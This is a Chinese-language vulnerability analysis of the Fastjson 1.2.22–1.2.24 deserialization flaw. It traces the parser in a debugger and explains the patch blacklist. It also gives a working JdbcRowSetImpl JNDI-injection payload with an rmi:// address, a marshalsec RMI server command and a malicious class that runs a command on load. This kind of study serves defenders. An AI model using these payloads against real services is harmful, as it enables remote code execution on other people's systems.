# 前言

Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作

Fastjson在进行反序列化操作时，并没有使用默认的readObject()，而是自己实现了一套反序列化机制。我们通过操作操作属性的setter getter方法结合一些特殊类从而实现任意命令执行

# 环境搭建

漏洞影响版本:1.2.22-1.2.24

maven项目添加依赖

```
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.22</version>
</dependency>
```

# Fastjson序列化与反序列化

## 序列化

fastjson的主要依赖于JSON.toJSONString来实现序列化

Student.java

```
package Fastjson.Test;

public class Student {
    private String name;
    private int age;

    public Student() {
        System.out.println("调用了构造函数");
    }

    public String getName() {
        System.out.println("调用了getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("调用了setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("调用了getAge");
        return age;
    }

    public void setAge(int age) {
        System.out.println("调用了setAge");
        this.age = age;
    }
}
```

Ser.java

```
package Fastjson.Test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Ser {
    public static void main(String[] args){
        Student student = new Student();
        student.setName("DawnT0wn");
        student.setAge(20);
        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);
        System.out.println(jsonstring);
    }
}
```

`SerializerFeature.WriteClassName`是`toJSONString`设置的一个属性值，设置之后在序列化的时候会多写入一个`@type`，即写上被序列化的类名，`type`可以指定反序列化的类，并且调用其`getter/setter/is`方法

![image-20220226114353313](images/1.png)

不加SerializerFeature.WriteClassName属性的时候的序列化值如下

![image-20220226114328590](images/2.png)



## 反序列化

fastjson可以使用三种形式进行反序列化:

- 通过parse方法进行反序列化，parse在解析过程中会调用目标类中的特定setter方法和getter方法
- 通过parseObject反序列化，不需要指定类,返回JSONObject。parseObject只是对parse进行了简单的封装
- 通过parseObject({},class),指定类，返回一个相应的类对象

可以看看他们的区别

```
public static JSONObject parseObject(String text) {
    Object obj = parse(text);
    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
}
```

parseObject包装了parse,但是在return的时候多了一步toJSON操作

来对比一下上面三种反序列化的操作

![image-20220226115516564](images/3.png)

可以看到第一种和第二种都没有反序列化成功,因为没有确定到底属于哪个对象的，所以只能将其转换为一个普通的JSON对象而不能正确转换，第三种指定了Student类就反序列化成功了

然后来试试用@type指定一个对象

![image-20220226120225061](images/4.png)

可以看到原来没成功的两种方法都成功了

并且JSON.parseObject在JSON.parse的基础上多调用了getter方法

@type关键词会加载任意类，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。也就是说，当我们找到一个类中的getter方法满足调用的条件,并且存在可利用点，就构成了一条攻击链

正是由于这种机制,造成了fastjson的反序列化漏洞

满足条件的setter：

```
方法名长度大于4且以set开头
非静态函数        
返回类型为void或当前类
参数个数为1个
反序列化的json字符串有该变量（例如getSex,json字符串就应该有sex变量
```

满足条件的getter:

```
方法名长度大于等于4        
非静态方法
以get开头且第4个字母为大写
无参数
返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong
反序列化的json字符串有该变量（例如getSex,json字符串就应该有sex变量
```

# Fastjson反序列化流程

先写一个带命令执行的getter方法

```
package Fastjson.Test;

public class Student {
    private String name;
    private int age;
    private String sex;

    public Student() {
        System.out.println("构造函数");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(int age) {
        System.out.println("setAge");
        this.age = age;
    }
    public String getSex() throws Exception{
        Runtime.getRuntime().exec("calc");
        return sex;
    }
}
```

Unser.java

```
package Fastjson.Test;

import com.alibaba.fastjson.JSON;

public class Unser {
    public static void main(String[] args) {
        String str = "{\"@type\":\"Fastjson.Test.Student\",\"age\":20,\"name\":\"T0WN\",\"sex\":\"man\"}";
        System.out.println(JSON.parseObject(str));
    }
}
```

![image-20220226174409268](images/5.png)

在parseObject处下断点

```
public static JSONObject parseObject(String text) {
    Object obj = parse(text);
    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
}
```

跟进parse

```‘
public static Object parse(String text) {
    return parse(text, DEFAULT_PARSER_FEATURE);
}
```

继续跟进parse

```
public static Object parse(String text, int features) {
    if (text == null) {
        return null;
    } else {
        DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
        Object value = parser.parse();
        parser.handleResovleTask(value);
        parser.close();
        return value;
    }
}
```

创建了一个DefaultJSONParser对象,跟进看看

```
public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) {
    this.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;
    this.contextArrayIndex = 0;
    this.resolveStatus = 0;
    this.extraTypeProviders = null;
    this.extraProcessors = null;
    this.fieldTypeResolver = null;
    this.lexer = lexer;
    this.input = input;
    this.config = config;
    this.symbolTable = config.symbolTable;
    int ch = lexer.getCurrent();
    if (ch == '{') {
        lexer.next();
        ((JSONLexerBase)lexer).token = 12;
    } else if (ch == '[') {
        lexer.next();
        ((JSONLexerBase)lexer).token = 14;
    } else {
        lexer.nextToken();
    }

}
```

这里会设置一个token=12

![image-20220226182642846](images/6.png)

回到parse

![image-20220226182707344](images/7.png)

跟进parse方法

```
public Object parse() {
    return this.parse((Object)null);
}
```

继续跟进

![image-20220226182742658](images/8.png)

这里就有点长了,不过因为设置的token是12,所以会进入case12

![image-20220226184253248](images/9.png)

首先会创建一个空的JSONobject对象,然后进入一个parseObject方法

![image-20220228163743345](images/10.png)

token为12,text是我们构造好的payload,进入else处理

首先会执行一个lexer.skipWhitespace(),如果跟进去看了的话就知道这里不会满足如何一个if,最后会直接return

![image-20220228164050511](images/11.png)

所以这里的ch为`"`,进入下图的if

![image-20220228164158248](images/12.png)

scanSymbol方法会遍历`"`内的数据，当数据一样的时候，就会直接放回value的结果，在经过一系列处理后,返回给key的值是@type

在261行，最开始的key也为@type,进入这个if

![image-20220228165018798](images/13.png)

![image-20220226190233770](images/14.png)

因为第二个双引号里面是@type指定的类,所以这里通过scanSymbol获取到@type指定的类,然后通过TypeUtils.loadClass加载类，这里的clazz的结果自然是我们需要的那个rce的触发类

![image-20220226190453163](images/15.png)

里首先会从mappings里面寻找类，mappings中存放着一些Java内置类，前面一些条件不满足，所以最后用ClassLoader加载类，在这里也就是加载类Student类

在这里加载Student类

![image-20220226190911573](images/16.png)

回到parseObject方法

![image-20220226191959047](images/17.png)

创建了ObejectDeserializer对象,并且调用了其deserialize方法

getDeserializer方法是黑名单限制反序列化类,这里黑名单只有java.lang.Thread

![image-20220226232920325](images/18.png)

到达deserialze方法继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可，最后调用了set和get里面的方法

可以在http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#fastjson-1-22-1-24这个链接看看流程

# JdbcRowSetImpl利用链

虽然是反序列化,但是最后的结果是导致jndi注入,可以使用RMI+JNDI或者LDAP+JNDI

这一条是在实战中最常用的

## 漏洞分析

前面走到deserialize这里不变,都是反序列化的流程,主要是加载目标类,但是之前说fastjson反序列化最后会调用目标类的setter或者getter方法,从deserialize这里出发,一直可以跟到JdbcRowSetImpl类的setDataSourceName方法

![image-20220228171948623](images/19.png)

将dataSourceName值设置为目标RMI服务的地址,主要是为了后面的getDataSourceName

接下来就是payload中设置了autoCommit值,调用setAutoCommit()函数

![image-20220228172216978](images/20.png)

跟进connect

```
public String getDataSourceName() {
    return dataSource;
}
```

这里的getDataSourceName是我们在前面setDataSourceName()方法中设置的值，是我们可控的，所以进入了elseif

![image-20220228172249835](images/21.png)

这里调用了InitialContext的原生lookup方法,实现了JNDI注入

## 漏洞复现

```
起一个rmi服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8088/#badClassName
```

Unser.java

```
package Fastjson.Test;

import com.alibaba.fastjson.JSON;

public class Unser {
    public static void main(String[] argv){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
```

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://172.16.159.53:1099/59bwt8", "autoCommit":true}
```

badClassName.java

```
public class badClassName {
    public badClassName() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

编译成class文件,并且开一个http服务

![image-20220228121507807](images/22.png)

LDAP的方法和只是把协议和服务改为LDAP即可

# TemplatesImpl利用链

虽然这条链在实战中用的很少,但是是流传较广的一条利用链了

漏洞原理：Fastjson通过`bytecodes`字段传入恶意类，调用outputProperties属性的getter方法时，实例化传入的恶意类，调用其构造方法，造成任意命令执行。

但是由于需要在parse反序列化时设置第二个参数Feature.SupportNonPublicField，所以利用面很窄

前面的都差不多相同,后面就有点像CC链的加载恶意的class文件了,具体流程可以参考http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#fastjson-1-22-1-24

# 补丁分析

从1.2.25开始对这个漏洞进行了修补，修补方式是将TypeUtils.loadClass替换为checkAutoType()函数,并且添加了黑名单

![image-20220228184411567](images/23.png)

```
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils,
org.apache.commons.collections.Transformer,
org.apache.commons.collections.functors,
org.apache.commons.collections4.comparators,
org.apache.commons.fileupload,
org.apache.myfaces.context.servlet,
org.apache.tomcat,
org.apache.wicket.util,
org.codehaus.groovy.runtime,
org.hibernate,
org.jboss,
org.mozilla.javascript,
org.python.core,org.springframework

```

但是这个补丁也有相应的绕过方法



参考链接

[java安全--FastJson 1.2.22-1.2.24漏洞分析 - Shu1L's blog](https://shu1l.github.io/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/#序列化与反序列化)

https://xz.aliyun.com/t/8979

http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#fastjson-1-22-1-24
